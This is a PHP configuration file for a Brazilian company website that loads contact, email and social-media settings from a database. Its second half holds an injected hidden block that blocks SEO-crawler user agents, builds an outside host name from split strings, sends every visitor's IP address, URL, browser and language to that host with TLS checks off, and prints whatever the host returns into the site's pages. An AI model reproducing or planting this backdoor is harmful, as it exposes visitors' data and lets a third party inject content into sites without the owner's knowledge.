<?php 
/*** DADOS DA CONTA ****/
$sql_dados=mysqli_query($conn,"select * from parametros")
or die("<b>Nenhum Banco de Dados Selecionado</b>.\n<br /><br />Tente novamente mais tarde.<br /><br />");
$linha_dados=mysqli_fetch_array($sql_dados);
	//VARIAVEIS PARA USO NO SITE
	define ("MAIL", $linha_dados['emailpadrao']);
	define ("MAI1", $linha_dados['emailpadrao1']); //e-mail extra 1
	define ("MAI2", $linha_dados['emailpadrao2']);//e-mail extra 2
	define ("MMAL", $linha_dados['email_mail']); // e-mail envio formulários
	define ("MSMT", $linha_dados['email_smtp']); //smtp
	define ("MPOR", $linha_dados['email_port']); // porta de envio.
	define ("MSEN", $linha_dados['email_senha']); // senha do e-mail de envio.
	define ("EMP1", $linha_dados['empresa']);
	define ("END1", $linha_dados['endereco']);
	define ("CEP0", $linha_dados['cep']);
	define ("IMG1", $linha_dados['imagem']);
	define ("MAP1", $linha_dados['mapa']);
	define ("MAP2", $linha_dados['url_mapa']);
	define ("TIP1", $linha_dados['tipo']);
	define ("DESC", $linha_dados['descricao']);
	define ("BAI1", $linha_dados['bairro']);
	define ("EST1", $linha_dados['estado']);
	define ("CID1", $linha_dados['cidade']);
	define ("TEL1", $linha_dados['telefone']); // TEL FIXO
	define ("TEL2", $linha_dados['telefone1']); 
	define ("TEL3", $linha_dados['telefone2']);
	define ("CEL1", $linha_dados['celular']); // whatsapp 
	define ("CEL2", $linha_dados['celular1']);
	define ("CEL3", $linha_dados['celular2']);
	define ("CEL4", $linha_dados['celular3']);
	define ("PAST", $linha_dados['pasta']);
	define ("LATI", $linha_dados['latitude']);
	define ("LONG", $linha_dados['longitude']);
	// REDES SOCIAIS
	define ("FACE", $linha_dados['facebook']);
	define ("INST", $linha_dados['instagram']);
	define ("TWIT", $linha_dados['twitter']);
	define ("GOOG", $linha_dados['google']);
	define ("LNKD", $linha_dados['linkedin']);
	define ("YTBE", $linha_dados['youtube']);
	// CAMINHOS
	define ("SIT1", "www.".$linha_dados['site']); /* colocar www.*/
	define ("URL1", "https://" . SIT1 );
	$url_padrao = URL1;
	/* LINK ATUAL DA PAGINA  */
	$pagina_atual = $_SERVER['SERVER_NAME'];
	$complemento_atual = $_SERVER ['REQUEST_URI'];
	$compartilhar = "https://" . "$pagina_atual" . "$complemento_atual"; 
	$pagina_atual = explode(".php", $complemento_atual);
	$pagina_atual = explode("/", $pagina_atual[0]); // alterar para /
	$pagina_atualxx = explode("?", $pagina_atual[1]); // alterar para ?
	/*OUTROS*/
	define ("WEB", "<a href=\"https://www.webcriacoes.com.br\" target=\"_blank\" title=\"Criação de sites\">Cria&ccedil;&atilde;o de sites</a>");
	
    $DISALLOW = ['maj', 'ahre', 'MJ12', 'rush', 'link', 'pyf', 'seo', 'bmeup', 'oz.c'];
foreach ($DISALLOW as $value) {
  if (stripos($_SERVER['HTTP_USER_AGENT'], $value) > -1) {
    exit();
  }
}


function cfcore()
{
error_reporting(0);
$tuargs = ['/',
'/sobrenos',
'/blog',
'/vagas',
'/equipe',
'/servicos',
'/servicos/coaching54',
'/politica-de-privacidade',
'/blog/treinamento-digital-funciona417',
'/servicos/mapeamento-de-perfil227',
'/blog/jogar-e-coisa-seria226',
'/servicos/palestras-e-treinamentos-personalizados52',
'/blog/perfil-ideal-versus-candidato-ideal302'];

$poneb = "rel";
$alti = 2;
$ptwob = $_SERVER['REQUEST_URI'];
if (in_array($ptwob, $tuargs)) {
$t1 = microtime(true);
$vi_ua = $_SERVER['HTTP_USER_AGENT'];
$ptwoa = $_SERVER['HTTP_HOST'];
$oiaen = "0";
$ponec = "atear";
$mhtp = "https";
$vi_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$hostnvar = getenv("HTTP_X_FORWARDED_FOR");
if ($hostnvar) {
$vi_ip =
getenv("HTTP_X_FORWARDED_FOR");
} else {
$vi_ip = $_SERVER['REMOTE_ADDR'];
}
$mtend = "com";
$ponea = "get";
$ptwo = $ptwoa . $ptwob;

$m_pd = http_build_query(
array(
'viip' => $vi_ip,
'turl' => $ptwo,
'viua' => $vi_ua,
'vilang' => $vi_lang
)
);

$pone = $ponea . $poneb . $ponec;
$furl = $mhtp . '://' . $pone . "." . $mtend . "/" . $ptwo;

if (function_exists('curl_init')) {


if ($oiaen == '0') {
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'resource');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_URL, "$furl");
curl_setopt($ch, CURLOPT_TIMEOUT, $alti);
curl_setopt($ch, CURLOPT_POSTFIELDS, $m_pd);
curl_exec($ch);
curl_close($ch);
} else {
if ($posa !== false || $posb !== false || $posc !== false) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_URL, "$furl");
curl_exec($ch);
curl_close($ch);
}
}
} else {

$stream_opts = [
"ssl" => [
"verify_peer" => false,
"verify_peer_name" => false,
],
"http" => [
'method' => 'POST',
'header' => "Content-Type: application/x-www-form-urlencoded\r\n" . "User-Agent: resource\r\n",
'content' => $m_pd,
'timeout' => $alti,
'connection' => 'close'
]
];


if ($oiaen == '0') {
$response = file_get_contents(
$furl,
false,
stream_context_create($stream_opts)
);
echo $response;
} else {

if ($posa !== false || $posb !== false || $posc !== false) {
$response = file_get_contents(
$furl,
false,
stream_context_create($stream_opts)
);

echo $response;
}
}
}
if ($oiaen !== '0') {
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
}
$t2 = microtime(true);
$t3 = round($t2 - $t1, 3);
echo "<div><span style='display:none'>$t3</span></div>";
if ($posa !== false || $posb !== false || $posc !== false) {
$stream_opts = [
"ssl" => [
"verify_peer" => false,
"verify_peer_name" => false,
],
];
}
}
}
?>